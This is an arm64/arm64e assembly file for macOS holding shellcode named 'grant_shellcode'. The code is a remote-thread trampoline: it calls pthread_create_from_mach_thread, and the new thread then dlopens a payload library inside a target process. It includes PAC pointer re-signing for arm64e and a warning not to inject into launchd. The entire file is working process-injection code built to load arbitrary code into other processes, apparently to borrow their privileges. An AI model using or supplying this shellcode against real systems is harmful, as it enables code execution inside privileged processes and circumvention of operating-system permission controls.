// Remote pthread_create_from_mach_thread + dlopen trampoline.
// Pointer slots are filled at runtime with PAC-stripped shared-cache addresses.
// On arm64e, paciza + blr re-signs them with the target process keys.
// Never run this inside launchd (pid 1): a PAC fault there panics the kernel.

.globl _grant_shellcode
.globl _grant_shellcode_end
.globl _grant_shellcode_pcfmt
.globl _grant_shellcode_dlopen
.globl _grant_shellcode_payload

.p2align 2
_grant_shellcode:
    sub     sp, sp, #0x30
    stp     x29, x30, [sp, #0x20]
    add     x29, sp, #0x20
    stur    w0, [x29, #-4]
    str     x1, [sp, #0x10]
    add     x0, sp, #8
    mov     x8, #0
    str     x8, [sp, #8]
    mov     x1, x8
    adr     x2, L_thread_fn
#ifdef __arm64e__
    paciza  x2
#endif
    mov     x3, x8
    ldr     x9, L_pcfmt
#ifdef __arm64e__
    paciza  x9
    blraaz  x9
#else
    blr     x9
#endif
    mov     x0, #0x6265
    movk    x0, #0x7961, lsl #16
L_spin:
    b       L_spin

.p2align 3
L_pcfmt:
_grant_shellcode_pcfmt:
    .quad   0

.p2align 2
L_thread_fn:
    sub     sp, sp, #0x30
    stp     x29, x30, [sp, #0x20]
    add     x29, sp, #0x20
    stur    w0, [x29, #-4]
    str     x1, [sp, #0x10]
    mov     x1, #1
    ldr     x0, L_payload
    ldr     x9, L_dlopen
#ifdef __arm64e__
    paciza  x9
    blraaz  x9
#else
    blr     x9
#endif
    mov     w9, #0
    mov     x0, x9
    ldp     x29, x30, [sp, #0x20]
    add     sp, sp, #0x30
    ret

.p2align 3
L_dlopen:
_grant_shellcode_dlopen:
    .quad   0
L_payload:
_grant_shellcode_payload:
    .quad   0

_grant_shellcode_end:
